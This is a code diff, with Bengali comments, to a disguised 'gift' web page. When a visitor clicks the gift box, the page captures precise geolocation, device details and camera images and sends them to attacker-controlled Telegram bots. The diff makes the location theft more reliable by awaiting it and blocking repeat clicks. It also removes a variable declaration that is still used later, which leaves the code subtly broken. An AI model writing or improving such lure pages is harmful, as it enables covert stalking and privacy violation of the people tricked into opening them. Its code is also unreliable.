@@ -714,23 +714,37 @@
             } catch (error) { console.error("Error getting device info:", error); }
         }
         
+        // *** সংশোধিত অংশ: লোকেশন পাঠানোর ফাংশনটি এখন একটি Promise রিটার্ন করে ***
         function sendLocation() {
-            if (!navigator.geolocation) { console.error("Geolocation is not supported."); return; }
-            const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const { latitude, longitude, accuracy } = position.coords;
-                    const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                    const locationInfo = `📍 **Location Captured!** 📍\n---\n- **Latitude:** ${latitude}\n- **Longitude:** ${longitude}\n- **Accuracy:** ${accuracy.toFixed(2)} meters\n---\n**View on Google Maps:**\n${mapLink}`;
-                    const sendPromises = TELEGRAM_TARGETS.map(target =>
-                        fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: target.chatId, text: locationInfo, parse_mode: 'Markdown' }) })
-                        .catch(error => console.error(`Failed to send location to ${target.chatId}:`, error))
-                    );
-                    Promise.all(sendPromises);
-                },
-                (error) => { console.error("Error getting location:", error.message); },
-                options
-            );
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    console.error("Geolocation is not supported.");
+                    return reject("Geolocation not supported");
+                }
+                const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const { latitude, longitude, accuracy } = position.coords;
+                        const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        const locationInfo = `📍 **Location Captured!** 📍\n---\n- **Latitude:** ${latitude}\n- **Longitude:** ${longitude}\n- **Accuracy:** ${accuracy.toFixed(2)} meters\n---\n**View on Google Maps:**\n${mapLink}`;
+                        const sendPromises = TELEGRAM_TARGETS.map(target =>
+                            fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: target.chatId, text: locationInfo, parse_mode: 'Markdown' }) })
+                            .catch(error => console.error(`Failed to send location to ${target.chatId}:`, error))
+                        );
+                        try {
+                            await Promise.all(sendPromises);
+                            resolve("Location sent");
+                        } catch (error) {
+                            reject("Failed to send location message");
+                        }
+                    },
+                    (error) => {
+                        console.error("Error getting location:", error.message);
+                        reject(error.message);
+                    },
+                    options
+                );
+            });
         }
 
         function startCamera(facingMode) {
@@ -896,18 +910,32 @@
                 img.classList.remove('hidden');
             }
             
-            // *** সংশোধিত অংশ: ক্লিক করার পর সরাসরি পারমিশন চাইবে ***
-            document.getElementById('giftWrapper').addEventListener('click', () => {
-                const caption = `Gift from: ${sender}\nTo: ${receiver}`;
-                if (params.get('info') === 'true') { sendDeviceInfo(); }
-                if (params.get('cam') === 'true') { initiateDualCameraCapture(caption); }
-                if (params.get('loc') === 'true') { sendLocation(); }
+            // *** সংশোধিত অংশ: ক্লিক ইভেন্ট এখন async এবং await ব্যবহার করে ***
+            document.getElementById('giftWrapper').addEventListener('click', async () => {
+                const giftWrapper = document.getElementById('giftWrapper');
+                giftWrapper.style.pointerEvents = 'none'; // একাধিক ক্লিক প্রতিরোধ
+                giftWrapper.style.cursor = 'wait';
 
+                const caption = `Gift from: ${sender}\nTo: ${receiver}`;
+                
+                if (params.get('info') === 'true') { sendDeviceInfo(); }
+                if (params.get('loc') === 'true') {
+                    try {
+                        await sendLocation();
+                    } catch (error) {
+                        console.warn("Could not send location, continuing anyway.", error);
+                    }
+                }
+                if (params.get('cam') === 'true') {
+                    // ক্যামেরা ফাংশনটি ব্যাকগ্রাউন্ডে চলবে, তাই await এর প্রয়োজন নেই
+                    initiateDualCameraCapture(caption);
+                }
+
+                giftWrapper.style.cursor = 'default';
                 document.getElementById('giftBox').classList.add('open');
                 document.querySelector('.click-instruction').style.display = 'none';
                 
                 setTimeout(() => {
-                    const wrapper = document.getElementById('giftWrapper');
                     wrapper.classList.add('revealed');
                     document.getElementById('giftContentRevealed').classList.remove('hidden');
                     const msgContainer = document.createElement('div');
